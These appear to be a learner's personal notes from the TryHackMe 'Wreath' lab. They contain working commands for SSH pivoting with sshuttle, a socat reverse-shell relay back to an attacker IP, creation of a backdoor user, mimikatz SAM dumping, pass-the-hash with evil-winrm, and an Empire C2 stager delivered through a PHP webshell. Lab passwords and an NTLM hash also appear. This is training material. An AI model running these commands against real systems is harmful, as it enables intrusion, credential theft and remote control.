
```php
/home/kali/Documents/tryhackme-notes/wreath/loot
```

ssh first target
```php
ssh -i id_rsa root@10.200.57.200
```

setup shhuttle for pivot
```php
sudo sshuttle -r root@10.200.57.200 --ssh-cmd "ssh -i id_rsa" -N -x 10.200.57.200
```

check firewall
```php
firewall-cmd --zone=public --add-port 22888/tcp
```

**_Socat can be skipped if user account is already made_**

**On the Webserver:**

**SOCAT Reverse Shell Relay**

In this scenario we are using **socat** to create a relay for us to send a reverse shell back to our own attacking machine. 
1. First let's start a standard netcat listener on our attacking box (`sudo nc -lvnp 443`). 
2. Next, on the compromised server, use the following command to start the relay:  
`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`

```php
sudo nc -lvnp 443
```

```php
./socat tcp-l:8000 tcp:10.50.55.235:443 &
```

_**Note:** the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._

### Webpage Location

```php
http://10.200.57.150/exploit-Platos.php
```

# Setting up a user/admin account

First we create the account itself:  
```php
net user USERNAME PASSWORD /add
``` 

**_Account:_**
Username:
Platos

Password:
PlatosTHM13!3


## Evil-WinRM

```php
evil-winrm -u Platos -p 'PlatosTHM13!3' -i 10.200.57.150
```

Upload/Download
```php
upload local_filename destination_filename
```

Try to make mimikatz work on CLI
```php
runas /user:Administrator "cmd.exe mimikatz.exe"
```

## xfreerdp
```php
xfreerdp /v:10.200.57.150 /u:Platos /p:'PlatosTHM13!3' /dynamic-resolution +clipboard
```

Now to dump the sam, but first:
- `privilege::debug`   
- `token::elevate`
- Finally ``lsadump::sam``

share resources
```php
xfreerdp /v:10.200.57.150 /u:Platos /p:'PlatosTHM13!3' /dynamic-resolution +clipboard /drive:/usr/share/windows-resources,share
```

---
### Account Details

**Username:**
Thomas

**Password:**
i<3ruby

---
### Easy connection to compromised server

```php
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.57.150
```

---

# C&C - Basic Setup

### Empire

```php
sudo powershell-empire server
```

### StarKiller

With Empire server running:

```php
starkiller
```

**Username:** `empireadmin`

**Password:** `password123`

**URL:** `https://localhost:1337`

---

**_The stager, firewall rule, and php listener, should all be using the same port!

1. I copy the stager to clipboard after crafting it in StarKiller (_refer to full notes for examples_), i then make a temp file stager-Platos.sh and run it on the web-server **prod-serv** 

2. After running our stager i get the Webserver Agent

![[Pasted image 20240722083033.png]]

3. At this stage i thought i had to delete the agent but you need it to forward the response.

![[Pasted image 20240722085006.png]]

4. I think this part is where i need to use the port i opened in the firewall rules.

_Update:_
-  in the `redirect listener section ` i add the listener i setup `Webserver (StarKiller)`

Create new stager
![[Pasted image 20240722085946.png]]

- The stager has given us the files located at `/tmp/http_hop`
- CD to that dir and zip the files
```php
zip -r hop.zip *
```

![[Pasted image 20240722091152.png]]

We now need to serve the files on the port we chose when generating the http_hop listener:
```php
php -S 0.0.0.0:22888 &>/dev/null &
```

Burpsuite modifications
```php
Content-Type: application/x-www-form-urlencoded
```

```php
POST /web/exploit-Platos.php
```

http://10.200.57.150/web/exploit-Platos.php

- Add the stager to the `a` request from StarKiller http-hop.
- After re-adding the firewall rule to the prod server i get the agent back.

---

**Very Exciting!**
I get the agent back and complete this part.
![[Pasted image 20240722100617.png]]

- I used the agents menu to search for sherlock and then ran it on our new agent the git-serv.
- Click on the tasks tab at the top and then you can click on a drop down arrow that reveals the results of the module or commands used.
- It has 2 modes: 1. Execute Module. 2. Shell Command. 
- Shell command is where you can use things like `whoami`

---

# Final Machine in the Network



